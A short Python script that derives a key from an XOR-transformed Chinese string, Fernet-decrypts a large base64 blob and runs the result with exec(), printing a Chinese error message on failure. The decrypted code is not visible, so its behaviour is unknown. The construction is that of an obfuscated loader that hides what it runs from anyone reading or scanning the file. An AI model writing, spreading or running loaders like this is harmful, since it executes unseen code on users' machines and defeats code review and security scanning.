try:
    import base64 as b,hashlib as h;    from cryptography.fernet import Fernet as F;    s="".join([chr((ord(c)^95)&0xFF) for c in "你好世界"*8]);    k=b.b64encode(h.sha256(s.encode()).digest());    exec(F(k).decrypt(b.b64decode("Z0FBQUFBQm41RHAtVUxqVm8tb01NUEdka0tSZEJaYWFTdjRmZzI2MzhhNVRlaXlXeHFrNTdmYVBLRDNONXN1bUY2MUJMQjZiblBZVXJfN0xyZzk5YUNrVGd5NVBXSXpRMFZ6bm01SVRwNnlsaHU3MkM4a3JEQ1FGQTFPV1FEN0Z5eXhHVnBPSHhYVXNNdm5NYWUtS0tOMFFjaGtyVWtUdXpiZXc3bkx4czJBY0FKUnlsM3dMWEg3VG80azVHWDdnV0xUZkRWS3lUdUhoTVdwdnZ1enpXY2NjT2dDeE8tby1OOTM3V2NlelZyeWtBVUZKdDg3UVk3RHpPenBfMGhhMC1yMTVKY0UyUnJISVRYUWdEbzZTMkVSM0lrTkNFR2FQRkJQLUdYbUE0QUpLTk1zUGhNc1BabkJkZ2IyZjh3VWlaQjlyWGJsZGlNQzg0d0hWQ1JXVHlySDVXUTlwZXE4ekltNEVjYUp4Mk9KNllESEN4ZmNFUndqODhUVW5peHBqNzNwVk44VVRJSGpZVkx2Uk5ZUUI2dlFVczlBQk4yelR3UUdoWGhfVjBiNzZzZ1c4bXJVX3YwdVlySHBSNHVGcWFBVXloWnB2VFNlMnQ5Rzg0aW5hanZ1OV9kS21RU0JDVzRIaXdFNUk1NVlmTlhDcXUyYV9JbUllX2REbi1yU3A5UVVsRmtDM3lacFkxZDd0M0w0R3RjaTJMb1dLVmtPSk1aXy11dkxXeWhCZG00UVJtOW5mY1RWRFNUTXhQN21BaW95UU12SVMzUmRyMTNhZUJ0SDVoQjI3MFJFdFZuZ3lyOEdhLXZEZU5MVWp4Zm5GNGM3VWZiTkVWS2UyclI1d3BpbXRlRFRFZG0xN0dlRk8tSlN6UHhBSjFzSkl3TkFzRExESERmQTU5dFZIeXRGbWFzUjFmZW5vdVpZeDBHdU45S3lySFRrc3dJNHhBVUY1REtSZDF0QzVXYzIwWFE3YkZKbWltWGZxWVIzaDY4LU1MSGpjLVF2aERRZFRXRGVybDVSTmdpXzdFdWtjakppc1JpMXN0MVRfamlYaTlveEJNdm1uRC1ZUk5MUWFaODNpRTY3SkZyTlVLUnpmTDdCOHMwWnZHX0U4VzFsVU5Kb0hWUVdrVkhPb054VXVmalhUVjhvSHVhVm4yS3lZZGxXLUhCek16enRlZmJ0S2pyWUZRQl96dzJUaTc4cDBadFdaZVRXb1dMUkpnekVoRlF0SE0ycHRmV2RNejBRQ0hLSkJJdXZ5aWIteWNfOTU0YjEyZ2NEcjgtb0VqSkwySkU2eHhPc1JNMlBBWVh3dExoMVg4aWhveVFZRC0zOTZxdjc3Ri1xUHFpRTVtQkhGR3c3aUdndVVXZ0dPQ3hBWFdoLVE5eUgxX2hlUUJXejFLSmVabGRKcDlZZXpWZTNHQnRDdi1palRVaEJDek15NTI5X2JHd3RiOEFmX2NHaUtVWkVyVXhIT0E5MWpJbWR6UVJhbldjcmQ5Y1k3NnN5R2NQdkQyaHJ0Sy1XOXpYR05OaWdHT2t5RDM3SFNadHhoYy1maWdMaUFVcWptLUwtc21Dalp3ZldRcjhSSFVRdVAxb3N0bEN5cldrbnI1bTRtSlB0dklpaTNHd3g5V3BFZDhTYXRMU3Y4ekl6M1VTSHZSVnRnNy03QjBseWhoVDVLbG4zTHE1ZGNTVTBQc3ZSbUcxVl9SWmcyTlZrQWFkWEh5Nm1aekdTQ3RYV3BLWnNKRjZraVZmSUdkQVZCUnBaN3VmN0djZkdyM3E1RkhZazZCbnpoQ3F2dmU0c2VSRXlPd2J0Wkh5STBtNnZYWDhxRFEtbjBkVUR5a1ZlNFlzWlRENmdMQThmRXppY2hIc21HVWRxYlItX1Z1SG44WjBSUmk5U3hoRmF3cS1rV1VXNllmQ2s1OG8xQTFBazhCWlNxYTFRZl9LYTBkT3hzcGRmTVdjaXlMYUhoai0yTWhTMVpDZmpCelRuQ3Bhcmp5QkJsZlI1ejVSVWFINWViQnZjUEZ2QmZVRG9VaU1pV1Y3VUNzX3psSUpValpueVZPaWRLM2NhUmN4U2praDhhd2tNV1IzTHZjZjdxYVZmTDNyNVFWMmxISHVYdkE0RkFMbHp1d2VZcG5yNUhIeEVjUXNoSGNuaVRoY3AwLTg5azJveUpncTBuZnh5WldWTXBRcnV2dDZMaHRid0tqdUticGQtaWJ1dGI0bF83SGFEeU5OMG5yNTJBSFc5ZFY3dkhzQ21tZmI3dGFIblJnVEdVQUdPX2t6VjE0d2pzdzN1VlBsUGdYOUwtUVlrVGpDY2JHdTlLbngzNUU3ZHZGNVQyT0paMDJib3lYc0pxSU5COXl4clpLRXEtbnBkclVuN00yelBkcUhpNGpzS1hybUtQcUpYSlJ2WXM0bXRlc2E3UDJGNnlUZDFqNzljdEdjMDY5ZE1hcDF6RzNCN294bFJMa2JjaWFpZHJWNXdoU3pHNnZTWTBXMUF1NGNiNzJGT0d6dlV5UzFadGNTM3RBNkU3RHc4aVpOcW5Ub3QwQ0NYMVpXcE5uU0tOZ3hqVU9ZcVlXMGMtamo3UTdmVmFfNWxnVlk2ZWFVRnROOEI3NS1zV01JY3VfWDVCV1NvUXlXZFBBcWNlWDlyc09BSlE2NFFiMUpDUWFRamNCb0dpRkZmampjUWtZQzNjOVJQeFBDSnFacldYSkpZTk9JY2dZTDZzcW53SDFfOV9vb3dnNFJxNUFNR3N1T2JDbi1sY2FRVWNORE9TVm1TamRXUzNWdEJaSjlMbFpSSFliekZHUUFHNnVLSnRvS1E0QTJFcDgxRHF5a0xZY2VndmZnX19qa3JXSDlxN25HQ2dVZFNDVWNER25ERXR3Wl9DNVJTOGZ2WUVEODhSZDFpWEI4M2pILTRrREJsQU9vbTNxbk9YampNZ2FNMDlORjhoV2JBMFJhN3YzanZmd3RnY3Iwc2tpLUgxYVQ1MHVBUmFmWTI2SmVNdkJhYU1mVkJsNHljNC1qOHZiNDhncVpFMHhoeUx6OEljNm9hVnBOTXpQdjI0MWNnYlowR2pIcHE1eVl2bGJ3MzdLYXR1MjNPTzhLZ1EycXNDdFZBLTBSQm01M2pnRVJqbEJMZFQzTXlwZXo5NHowS1cyNm8zSDBaTER4ekwtM0JDTEhjQWpkbG5aemlWUnlCUEFteVVNcWhnbnkxSExVWVB1YS0zRm1LbHRnSTVnZGZDWjB3MHdVbGJmWDRMM3pLd3NLTHU3LXYxM194OXNndmpfVE9CbldQRFdUOVBVZ2FZREhMVTR0TURETVdzamRrZEllWnVPdlB3X1lLSy1TUEV1MGp2YnpEanlyMS1yel9rU1lyNy1McHdpa3ZvaFNpUmV2RkF3d2FzWUxqRlFadGxCNW14ZVRRQTVSQ3ZPRUkxOUd4UGwxZVNrV2dkX0RkYmhUMnREWE9SUVJKcm5yVXp4ZmFzUmk0OWlSekVrTlJLeUlzVmgwV3I2amlFNktnYTA2dUxEaUJaQ2JrMDhtRmpTQVV3RmR4ZklicklPWHZrVGVLdjVDT0RsaWtzZDhrVU9GaDRNZ2NRRXF1VXlHSHN5TVJ6WTRKd0NaYUJ4QW1oWEduQUpOTmxUOVN2Mk9WV2E0SGlmdWRyNmJHbVVuSkplenVGc1JBTkNzRThKbklIdGFvbXhhMV9BSEppejN5d2IwcnVmS2g1enROeWlfcmN4Q1dtRUl1cTl3cDNuS05tRU10MmZwWS1Db3FHU2g4ZXNIOWRaZEVvamgtOUdjTTRvZkIwS2twbHRLRFc2amhJdmJhMGxMVFRKQjY0Umhid1M1eFR1NmVJdHRxNzRBbUo0VFBDNUM2TjRtanp3WllTeUtheW9NY2RPVERYdzRuQmc0SjZXX2ZKeGRMVXRObHQ5TmFzMGRzOFhTU1R3Y3BBT2p0MnBHZEJYUHVjWGNJZE56UHhCN3JzY0pfWjloLW1XVnpiQURUalRPQndkMV9xVzBhbTZnN3o1VWVsakF6Y0N4TF9GcDlyMHpWbU1kZ0xheGJTY3J4YVprbm51MFlvX1k2aVFJb1Nld0djUEVEcFRrNXNrcGJyM2M5a0RzZ1RQaGl4eHNxSUVBR3NPOGhYYjRGMmZBUUxucXZOeG51bmphZ19HdmVLa01zRmtydjRmSkdDWC14bmlkZThYY0lQeFF6MzM5bTN2b3VnNWsxOGZTa3Zzd2V3bnpKNUFMSGpDbnpTTEdqSjFUUGtTSS1XYTI5eE5xVndRYUxrUTVreTM0czRGVm1xQVNxWXBIU3l0QXNKblZ5OGplMmdLSGJCdGNHdVhHMWVoQjZwYUh4dHM3eGRoX2VHUU1CSVdNclNuQkFyd2xCSWxhbDJoMm4zOWxBamlXRVJIaVU2V1VCWW5pdEtvMnJja3MzNUR0aEswQ0I5c2FfaHpEWFpnbG5NM2tfQTNvczhTbmoyNVhsRzl6c20wcHI0RURqRjFScVhoVHZVbGRJd085bTg3T3NtUm5HYVF2TGpERkRNMGFzNXptSGw1VENTdGhQVGRNNTdpNTg0UHdkN2tkSFFBU190NUxXbWJmcXpKS0p4ZFVkakhIclVFVHh2U3BsQ0pZcnZSUHdVc2VRYWVHaWJTa0tVWGF0SUZDUEZmNEJZVnVXSkx0Ty02UkZwbEdKa003cFZHQzRWZjdHWjFDa1h5WWFueU04eFhBTnNTWGpVdkFRWkNaU185ZEhwcTJRVUVnTHpxWjVocmluYTNyMnB0U0VvQ1dSSHVNVWctbnVIT3o4N3U3emE5cnhSZ0wzUFZ2ampHNWp0MUtfMC1iamRZQmtJdUE0cGFFc0RCUmdKREpHX25YNGpTRTE0aTB0MG1tU0hIT3IxZmE1Z0oxVXh2N1BybmZLMVJjbDJuU1pXaC0zcmtabkxPTS1FRGllVzctN3huZ3FPeGlmVm02aGtoZlR4bEFWTGxBNl95MzlfYmFoOXRUMmZHNGRfaUJWeUFVdEhtckJpNzNuUEUtVmhOeER5bldDWTJlOVpSdTZZOW5hVWlPVDJ5NEtUWVhfRDlId1c5YXdQTEtZWlU1THlzMDUwX2pBQ0hYUDZ3V1h3MS1oMEZsYmVPWXhjNlRvYm5Sb0JVMHlhMnBQQjgtUGx2bjBtOG1KR29KdTk4aHRReHNMejlKLWdJZVRTUEFzVS1OZ2hDRmZPQ0xMX3M0Z1gyZS1WblQ1b3ROUURTMW1yUjhXbjYxSUptN2FQN0FNZUo3WjBZbjZYM3R4Q0dlc25LRHhPX25jS0MybXF6X3hVYjg0ZFBkUFNUUVlWRVNFNXNodHlkX0NjbFZnLU1zQ2tMc3czbnJFbVNxM254UFltZEo2dnVhRHJBTWRkMTFQQjl1RFN1LTl4NERhckkyY0xKZzRaOXU3cWNHazNpYnJlaURqb2lyN0F6UVRTamtsT1g1SmE5VGpFbHR4cHU0eHN4SW5MemFYVUpYc1FFcGlpTS1RZ0ZpMUJWM1BhRkF6SUc5N3JyX0JFWmVyUkRraHR3YWlRRHEyWkd5UEtKaDFOc0ZqNlNJLUI5bmhVeGJoNWNvaHJVcU5yR1hKd3JoWEdRYmhMclphei16Z2V0T1B1amhwdzBuU0JFeEE0RDlKam1rWnUxTDJGc0ZxbDJZcUdyM0JHNVQtSUQzTnZ1TmpzV1hUQTcycS1SX1pIWE9MR2N2Zzc4ekhUVnpyai1lMEloaUtyamN3eTZtbHF4ZTNPNHZRcVU5RHZfQ05qRGR6OXlLYUZDV0R5M1hSUnFEMTlxb0luaXdhYnMyTlBveUI2dldYeS1vTS0xaDFpcUdONUFYb211bkV1Ym8wRnlNZlEydTlGTjhvcmZZMERkeFp2dF82RjJYTkJSRHNfR2RLMGIzUWxUNGJnSXhrSlJLWTB6NTVNcUlCaHA5TXBWc19EQlEzQ2JKa0lNVTB3bFBlMTM1Ym5KcHc0YkhJZ0NxaUNTRmVqaUlJVnd6RVhzOXZkT1RtZFJOWFN2ZWVEM3lGbzZ2VEphUkJYVHBlWlpDQXNaRjc4U2NQbFNyMjE0cExrS3dWamlHUnotcVZqRVBhQ3RtdTNGNVlZUnJFNnNucmtyc0Fuekh4Ry1CS0w3Mm5jRmxqMnFoN3FMZTZib0VlWk5VV0pra2J0aDVuN0RnV0JFQ2tfVGV1T3AwSEd1LW1Wb19BNjZlaXVqOVcyQUt5XzMwTE1QX1pmQ0xWVllYai1yR3o1SFd5VTkwVlZqSDRoX2I1QW92cGNETlVwMkhRVnhhRTFkNEN0Tl81UHJmdmVZc09LZlJNUHNCdnhGVGlRdXBQcEF1VFNQc2Y3c1lnSS1KaWNncWswNlhkX0RRPT0=")).decode())
except Exception as e:
    print(f"运行错误: {str(e)}")
